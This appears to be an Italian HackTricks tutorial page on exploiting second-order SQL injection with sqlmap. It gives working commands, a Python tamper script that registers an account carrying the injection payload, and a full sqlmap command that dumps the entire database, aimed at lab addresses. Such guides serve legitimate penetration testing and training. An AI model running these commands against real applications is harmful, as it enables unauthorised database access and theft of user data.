{{#include ../../../banners/hacktricks-training.md}}

**SQLMap può sfruttare le SQL di Secondo Ordine.**\
È necessario fornire:

- La **richiesta** in cui il **payload di sqlinjection** verrà salvato
- La **richiesta** in cui il **payload** verrà **eseguito**

La richiesta in cui il payload di SQL injection è salvato è **indicata come in qualsiasi altra iniezione in sqlmap**. La richiesta **dove sqlmap può leggere l'output/esecuzione** dell'iniezione può essere indicata con `--second-url` o con `--second-req` se è necessario indicare una richiesta completa da un file.

**Esempio semplice di secondo ordine:**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
In diversi casi **questo non sarà sufficiente** perché sarà necessario **eseguire altre azioni** oltre a inviare il payload e accedere a una pagina diversa.

Quando ciò è necessario, puoi utilizzare un **sqlmap tamper**. Ad esempio, il seguente script registrerà un nuovo utente **utilizzando il payload di sqlmap come email** e disconnetterà.
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def login_account(payload):
proxies = {'http':'http://127.0.0.1:8080'}
cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
url = "http://10.10.10.10/create.php"
pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

url = "http://10.10.10.10/exit.php"
pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
headers = kwargs.get("headers", {})
login_account(payload)
return payload
```
Un **tamper di SQLMap viene sempre eseguito prima di iniziare un tentativo di iniezione con un payload** **e deve restituire un payload**. In questo caso non ci interessa il payload ma ci interessa inviare alcune richieste, quindi il payload non viene modificato.

Quindi, se per qualche motivo abbiamo bisogno di un flusso più complesso per sfruttare l'iniezione SQL di secondo ordine come:

- Creare un account con il payload SQLi all'interno del campo "email"
- Disconnettersi
- Accedere con quell'account (login.txt)
- Inviare una richiesta per eseguire l'iniezione SQL (second.txt)

**Questa riga di sqlmap sarà utile:**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
{{#include ../../../banners/hacktricks-training.md}}
